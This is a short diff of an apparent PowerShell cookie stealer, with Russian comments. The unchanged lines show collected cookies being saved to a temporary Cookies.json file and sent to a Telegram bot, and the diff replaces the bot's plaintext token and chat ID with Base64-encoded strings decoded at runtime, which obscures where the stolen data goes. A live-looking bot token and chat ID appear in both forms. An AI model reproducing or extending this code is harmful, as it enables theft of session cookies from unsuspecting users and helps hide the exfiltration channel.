@@ -153,8 +153,13 @@ $tempFilePath = "$env:TEMP\Cookies.json"
 $jsonResponse | ConvertTo-Json -Depth 10 | Out-File -FilePath $tempFilePath -Encoding UTF8
 
 # Отправка файла в Telegram
-$botToken = "7677386741:AAFrg5fM7pBPcGeljsPI9BxyHAxXsBzoWl8"  # Замените на ваш токен бота
-$chatId = "1521132127"     # Замените на ваш chat_id
+# Base64 строка (закодированный токен)
+$EncBotToken = "NzY3NzM4Njc0MTpBQUZyZzVmTTdwQlBjR2VsanNQSTlCeHlIQXhYc0J6b1dsOA=="
+$EncChatId = "MTUyMTEzMjEyNw=="
+
+$BotToken = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncBotToken))
+$ChatId = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncChatId))
+
 Send-FileToTelegram -FilePath $tempFilePath -ChatId $chatId -BotToken $botToken
 
 # Удаляем временный файл
